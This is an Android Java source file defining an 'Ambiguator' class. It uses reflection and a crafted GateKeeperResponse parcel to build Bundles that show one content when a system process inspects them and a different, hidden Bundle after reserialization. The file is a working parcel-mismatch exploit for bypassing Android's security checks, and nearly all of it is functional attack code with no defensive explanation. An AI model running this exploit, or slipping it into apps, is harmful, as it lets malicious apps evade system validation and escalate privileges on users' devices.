package com.example.ambigousbundle3;

import android.os.BaseBundle;
import android.os.Bundle;
import android.os.Parcel;

import java.lang.reflect.Field;
import java.util.Random;

/**
 * Class for producing bundles that change their content after inspecting and forwarding to other process
 */
public class Ambiguator {

    private static final int VAL_PARCELABLE = 4; // Copied from Parcel
    private static final int VAL_NULL = -1; // Copied from Parcel
    private static final int BUNDLE_SKIP = 12; // len(length, BUNDLE_MAGIC, N)

    private final Field parcelledDataField;

    public Ambiguator() throws Exception {
        // Get fields for reflection
        parcelledDataField = BaseBundle.class.getDeclaredField("mParcelledData");
        parcelledDataField.setAccessible(true);
    }

    public Bundle make(Bundle preReSerialize, Bundle postReSerialize) throws Exception {
        // Find key that has hash below everything else
        Random random = new Random(1234);
        int minHash = 0;
        for (String s : preReSerialize.keySet()) {
            minHash = Math.min(minHash, s.hashCode());
        }
        for (String s : postReSerialize.keySet()) {
            minHash = Math.min(minHash, s.hashCode());
        }

        String key;
        int keyHash;

        do {
            key = randomString(random);
            keyHash = key.hashCode();
        } while (keyHash >= minHash);

        // Pad bundles
        padBundle(postReSerialize, preReSerialize.size() + 1, minHash, random);
        padBundle(preReSerialize, postReSerialize.size() - 1, minHash, random);

        // Make key2 (Containing postReSerialize, having hashCode between keyHash and everything else in Bundles)
        String key2;
        int key2Hash;
        do {
            key2 = makeStringToInject(postReSerialize, random);
            key2Hash = key2.hashCode();
        } while (key2Hash >= minHash || key2Hash <= keyHash);


        // Write bundle
        Parcel parcel = Parcel.obtain();

        parcel.writeInt(preReSerialize.size() + 2); // Num key-value pairs
        parcel.writeString(key); // Key

        parcel.writeInt(VAL_PARCELABLE);
        parcel.writeString("android.service.gatekeeper.GateKeeperResponse");

        parcel.writeInt(0); // GateKeeperResponse.RESPONSE_OK
        parcel.writeInt(0); // GateKeeperResponse.mShouldReEnroll = false
        parcel.writeInt(0); // Size of array (used by GateKeeperResponse..createFromParcel)

        // Key containing array to be misinterpreted and encoded postReSerialize Bundle
        parcel.writeString(key2);
        parcel.writeInt(VAL_NULL); // No value, just key is relevant

        // Data from preReSerialize bundle
        writeBundleSkippingHeaders(parcel, preReSerialize);

        parcel.setDataPosition(0);
        Bundle bundle = new Bundle();
        parcelledDataField.set(bundle, parcel);
        return bundle;
    }

    private String makeStringToInject(Bundle stuffToInject, Random random) {
        // Initialize parcel
        Parcel p = Parcel.obtain();
        p.writeInt(0); // String length - will patch
        p.writeInt(0); // byte[] length - will patch

        Parcel p2 = Parcel.obtain();
        stuffToInject.writeToParcel(p2, 0);
        int p2Len = p2.dataPosition() - BUNDLE_SKIP;

        // Padding in array to be misinterpreted as payload
        for (int i = 0; i < p2Len / 4 + 4; i++) {
            int paddingVal;
            if (i > 3) {
                paddingVal = i;
            } else {
                paddingVal = random.nextInt();
            }
            p.writeInt(paddingVal);

        }

        // Data to be read as Bundle after reserialization
        p.appendFrom(p2, BUNDLE_SKIP, p2Len);
        p2.recycle();

        // Padding
        while (p.dataPosition() % 8 != 0) p.writeInt(0);
        for (int i = 0; i < 2; i++) {
            p.writeInt(0);
        }

        // Make string from Parcel
        int len = p.dataPosition() / 2 - 1; // Calc length
        p.writeInt(0); p.writeInt(0); // Padding (Won't be included in string)
        p.setDataPosition(0); // Patch length
        p.writeInt(len); // String length
        p.writeInt(len); // byte[] length
        p.setDataPosition(0); // Read as string
        String result = p.readString();
        p.recycle();
        return result;
    }

    private static void writeBundleSkippingHeaders(Parcel parcel, Bundle bundle) {
        Parcel p2 = Parcel.obtain();
        bundle.writeToParcel(p2, 0);
        parcel.appendFrom(p2, BUNDLE_SKIP, p2.dataPosition() - BUNDLE_SKIP);
        p2.recycle();
    }

    private static String randomString(Random random) {
        StringBuilder b = new StringBuilder();
        for (int i = 0; i < 6; i++) {
            b.append((char)(' ' + random.nextInt('~' - ' ' + 1)));
        }
        return b.toString();
    }

    private static void padBundle(Bundle bundle, int size, int minHash, Random random) {
        while (bundle.size() < size) {
            String key;
            do {
                key = randomString(random);
            } while (key.hashCode() < minHash || bundle.containsKey(key));
            bundle.putString(key, "PADDING");
        }
    }
}
